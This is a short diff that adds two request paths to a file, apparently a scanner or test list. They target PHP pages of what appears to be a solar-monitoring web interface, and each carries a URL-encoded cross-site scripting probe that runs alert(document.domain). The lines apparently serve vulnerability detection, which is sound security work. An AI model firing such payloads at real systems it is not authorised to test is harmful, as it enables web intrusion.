@@ -1,0 +1,2 @@
+/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6
+/Solar_AiConf.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
